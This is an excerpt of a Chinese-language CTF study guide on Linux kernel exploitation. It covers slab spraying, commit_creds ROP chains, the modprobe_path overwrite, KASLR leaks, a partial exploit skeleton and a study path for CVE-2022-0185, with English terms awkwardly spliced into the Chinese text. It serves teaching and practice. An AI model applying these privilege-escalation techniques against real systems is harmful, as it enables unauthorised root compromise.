...
kernel/
├── bzImage          # 压缩kernel镜像
├── vmlinux          # 未压缩kernel（带符号，用于 gdb）
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerabilitydriver
├── run.sh           # qemu startscript
└── (.config)        # compileconfiguration，optional
```

### 拆 initramfs 改 init script
...
```bash
# 用 extract-vmlinux script（kernel 源码 scripts/）
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU startparametertemplate
...
criticalparameter对应的保护：

| parameter | 含义 | 影响利用 |
|------|------|---------|
| `+smep` | kernel态不能execute用户态代码 | must用 ROP，不能跳到用户态 shellcode |
| `+smap` | kernel态不能访问用户态数据 | rop 链不能放用户态，要放kernel态（heap喷 / msgsnd） |
| `+pku` | Protection Keys | 类似 SMAP |
| `nokaslr` | 禁用 KASLR | 函数地址固定 |
| `kaslr` | 启用 KASLR | must leak |
| `pti=on` | KPTI（Meltdown remediation） | 用户态返回需要 swapgs_restore_regs_and_return_to_usermode |
...
GEF 推荐用 bata24 维护的 fork，对kernel结构体有专门 pretty-print。

## vulnerability类型distribution

| vulnerability | 典型来源 | 利用基线 |
|------|---------|---------|
| kernel栈溢出 | copy_from_user 长度可控 | 栈金丝雀 + KASLR → ROP |
| kernelheap溢出 | kmalloc slab 越界写 | slab 喷射 + 覆盖相邻对象 |
| UAF | refcount error / 双 free | 重新申请同 slab → 控制释放对象 |
| 整数溢出 | size 计算溢出 → 小分配大拷贝 | 实际是溢出，同上 |
| TOCTOU | 用户态指针二次解引用 | userfaultfd / FUSE 拖时间 |
| race | 双thread同时 ioctl | 卡时序窗口 |
| 任意读写 | 已经是终极原语 | 直接改 cred / modprobe_path |

## slab 喷射（heap pwn 核心）

把可控大小的kernel对象喷到vulnerability slab，覆盖target对象。
...
| kmalloc-128 | `user_key_payload` | keyctl 系列interface |
...
uint64_t rop[] = {
    ...
    commit_creds,                     // 设置当前process cred = root
...
**critical gadget**（要在 vmlinux 里 ROPgadget 找）:
...
```text
原理：
  - kernel全局变量 modprobe_path default "/sbin/modprobe"
  - 当 execve 一个不认识 magic 的file时，kernel调用 modprobe_path 以 root execute
  - 改成 "/tmp/x"，写 /tmp/x（chmod +x），触发未知 magic execute
...
// 3. vulnerability写：把 modprobe_path 改成 "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. 触发
system("/tmp/trigger");
// kernel root 跑 /tmp/x，做了 chmod +s /bin/su
...
改成 "|/tmp/x %P"，让process崩溃时调用
缺点：需要触发 coredump，比 modprobe_path 笨重
```

### 4. kernel ROP 关 SMEP/SMAP
...
uint64_t rop[] = {
    ...
    0,
    user_shellcode_addr,    // 跳过去（如果还没关 SMEP 这步会failure）
};
```
...
| /sys/module/.../sections/.text | 同上 | module基址 |
| dmesg | `dmesg_restrict=0` 才能读 | oops info泄漏地址 |
| kernel栈未初始化读 | vulnerability本身要能任意读 | 残留地址 |
| msg_msg + vulnerability leak | 喷射后 OOB read | 通用 |
| 旁路（Meltdown/Spectre） | KPTI 修了 Meltdown | 不通用 |
| SIDT/SGDT 用户态指令 | 老kernel可能漏 | 现代基本封了 |
...
## 完整 exploit template（用户态 + ioctl 触发 + ROP privilege escalation + shell）

```c
// exploit.c — kernel pwn 通用骨架
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
...
int main(void) {
    ...
    // 3. 触发vulnerability，让kernel RIP 跳到 rop[0]
...
```text
vulnerability：fs/fs_context.c 中 legacy_parse_param 长度计算有符号 / 无符号obfuscation
      → kmalloc heap缓冲区溢出，size 任意，data 任意
...
学习path：
1. compile带 CONFIG_USER_NS=y 的kernel
2. 跑 Crusaders of Rust 的原版 PoC：https://www.openwall.com/lists/oss-security/2022/01/18/7
3. 看 willsroot.io 的官方 writeup（PortSwigger 收录的version）
4. manual重写：把 msg_msg 喷射改成 pipe_buffer 喷射version（练习不同 slab path）
5. 加上 KASLR leak（原版用 /proc/kallsyms，挑战版禁用后改 OOB read）
```

主要技术点对应本documentation的章节：

- vulnerability类型 → "kernelheap溢出"
- 喷射对象 → "msg_msg 喷射"
- privilege escalation方法 → "commit_creds ROP" 或 "modprobe_path"
- KASLR leak → "/proc/kallsyms" 或 "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** 让kernel栈基址每次 syscall 都随机偏移 0-1023，影响所有dependency固定栈偏移的利用
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** 让 slab 内对象分配随机化，喷射success率下降，要多喷
- **CONFIG_STATIC_USERMODEHELPER** 把 modprobe_path 设为只读 `static_usermodehelper_path`，modprobe 攻击失效
- **KPTI** 让用户态/kernel态页表分离，返回用户态must走 `swapgs_restore_regs_and_return_to_usermode` 这个 trampoline，不能直接 swapgs+iretq
- **FG-KASLR**（function-granular KASLR）让函数级别随机化，需要 leak 多个符号反推每个函数偏移
- **CET / IBT**（Intel 控制流强制）让间接跳转must落在 ENDBR 指令，部分 gadget 失效
- **不要在kernel里调 printk outputTesting** — 串口 IO 会改变时序，破坏 race；用一个 magic 寄存器值（rcx=0xdeadbeef）+ gdb watch 来debugging
